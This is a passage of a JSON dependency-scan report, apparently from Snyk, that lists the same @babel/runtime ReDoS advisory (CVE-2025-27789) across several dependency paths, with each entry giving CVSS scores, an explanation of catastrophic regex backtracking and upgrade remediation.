[
  {
    "vulnerabilities": [
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@emotion/react@11.11.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@emotion/react@11.11.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@emotion/styled@11.11.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@emotion/styled@11.11.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/icons-material@5.11.16",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/icons-material@5.11.16",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/lab@5.0.0-alpha.131",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
